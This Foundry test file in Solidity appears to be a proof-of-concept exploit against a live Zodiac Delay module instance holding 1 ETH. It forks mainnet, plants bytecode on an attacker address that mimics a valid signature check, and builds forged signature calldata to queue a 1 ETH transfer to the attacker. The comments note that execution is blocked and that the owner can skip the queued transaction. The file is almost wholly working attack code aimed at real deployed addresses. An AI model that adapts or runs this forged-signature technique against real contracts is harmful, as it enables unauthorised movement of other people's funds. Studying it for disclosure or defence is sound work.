// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// @notice Delay v1.1.0 forged-signature queue on the live 1 ETH instance.
/// The authentication bypass works (the tx is queued), but the queue is
/// already stuck at txNonce=9 behind a pre-existing MultiSend transaction
/// that reverts with Safe GS104, so the attacker's tx at index 12 cannot be
/// executed. The owner can unstick it with setTxNonce(), which also lets the
/// owner skip the attacker's tx. See ZodiacDelayQueueTest for the liveness
/// proof.
contract ZodiacDelayTest is Test {
    address constant DELAY = 0x0F1D8A73C02F2E44b17aF3e1ac389E7ce0a2E15B;
    address constant AVATAR = 0x36B42d0EE96d66928674E02B005dF2d8D75E68C5;
    address internal ATTACKER;
    address internal FRESH;

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        ATTACKER = makeAddr("delay-attacker");
        FRESH = makeAddr("delay-fresh");
        vm.etch(ATTACKER, hex"631626ba7e6000526004601cfd");
    }

    function _forgedCall(address to, uint256 value, bytes memory inner, uint8 operation)
        internal
        view
        returns (bytes memory)
    {
        bytes memory args = abi.encodeWithSelector(
            0x468721a7, // execTransactionFromModule(address,uint256,bytes,uint8)
            to,
            value,
            inner,
            operation
        );
        bytes memory safeSig = abi.encodePacked(
            bytes32(uint256(uint160(ATTACKER))),
            uint256(65),
            uint8(0),
            uint256(32),
            bytes32(uint256(0xA11CE))
        );
        return abi.encodePacked(
            args,
            safeSig,
            bytes32(uint256(0x5A17)),
            bytes32(uint256(uint160(AVATAR))),
            bytes32(args.length),
            uint8(0)
        );
    }

    function test_delay_queue_only_auth_bypass() public {
        uint256 q0 = _u(DELAY, 0xde8dd91d); // queueNonce()
        uint256 n0 = _u(DELAY, 0xc66323e5); // txNonce()

        vm.prank(FRESH);
        (bool ok, bytes memory ret) = DELAY.call(_forgedCall(ATTACKER, 1 ether, "", 0));
        emit log_named_string("queue success", ok ? "TRUE" : "false");
        emit log_named_bytes("queue revert", ret);
        assertTrue(ok, "forged queue failed");
        assertEq(_u(DELAY, 0xde8dd91d), q0 + 1, "queueNonce did not increment");

        bytes32 queued = _hash(DELAY, ATTACKER, 1 ether, "", 0);
        assertEq(_txHash(DELAY, q0), queued, "queued hash mismatch");
        emit log_named_uint("attacker queue index", q0);
        emit log_named_uint("txNonce (next to execute)", n0);
        emit log_named_uint("avatar ETH (wei)", AVATAR.balance);
        // 1 ETH is now queued to the attacker, but it sits behind txNonce.
        assertEq(AVATAR.balance, 1 ether);
    }

    function _txHash(address d, uint256 nonce) internal view returns (bytes32 h) {
        (bool ok, bytes memory r) = d.staticcall(abi.encodeWithSelector(0x6b0a4cf6, nonce));
        if (ok && r.length >= 32) h = abi.decode(r, (bytes32));
    }

    function _hash(address d, address to, uint256 value, bytes memory data, uint8 op)
        internal
        view
        returns (bytes32 h)
    {
        (bool ok, bytes memory r) = d.staticcall(
            abi.encodeWithSelector(0x300c661f, to, value, data, op)
        );
        if (ok && r.length >= 32) h = abi.decode(r, (bytes32));
    }

    function _u(address t, bytes4 sel) internal view returns (uint256 v) {
        (bool ok, bytes memory r) = t.staticcall(abi.encodeWithSelector(sel));
        if (ok && r.length >= 32) v = abi.decode(r, (uint256));
    }
}
